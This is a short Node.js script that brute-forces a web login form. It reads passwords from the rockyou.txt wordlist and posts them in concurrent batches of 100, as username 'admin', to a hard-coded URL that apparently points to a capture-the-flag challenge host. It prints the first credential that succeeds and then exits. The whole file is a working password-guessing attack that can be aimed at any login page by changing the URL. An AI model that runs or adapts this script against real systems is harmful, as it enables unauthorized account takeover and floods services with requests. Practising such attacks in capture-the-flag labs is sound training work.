const fs = require("fs");
const readline = require("readline");
const EventEmitter = require("events");
const event = new EventEmitter();

const rl = readline.createInterface({
  input: fs.createReadStream("./rockyou.txt"),
});

const URL =
  "http://eci-2zeff3yzww80c4xn6b6i.cloudeci1.ichunqiu.com:8888//login";

// Batch processing function
async function processBatch(batch, counter) {
  const promises = batch.map((password) =>
    postRequest("admin", password.trim())
  );
  await Promise.all(promises);
  console.log("Batch processed %d", counter);
}

(async () => {
  let batch = [];
  const batchSize = 100; // Number of requests per batch

  let counter = 0;
  for await (const password of rl) {
    batch.push(password);
    if (batch.length === batchSize) {
      counter++;
      await processBatch(batch, counter);
      batch = []; // Reset batch
    }
  }

  // Process any remaining passwords in the last batch
  if (batch.length > 0) {
    await processBatch(batch);
  }
})();

// post a request to the URL with parameters username and password, use form-data
function postRequest(username, password) {
  const formData = new FormData();
  formData.append("username", username);
  formData.append("password", password);

  return fetch(URL, {
    method: "POST",
    body: formData,
  })
    .then((response) => {
      if (!response.ok) {
        return;
      }

      return response.text();
    })
    .then((data) => {
      if (!data) {
        return;
      }

      // emit a success event
      event.emit("success", { username, password, data });
    });
}

// subscribe to the success event
event.on("success", ({ username, password, data }) => {
  console.log(`Success: ${username}:${password}`);
  console.log(data);
  process.exit(0);
});
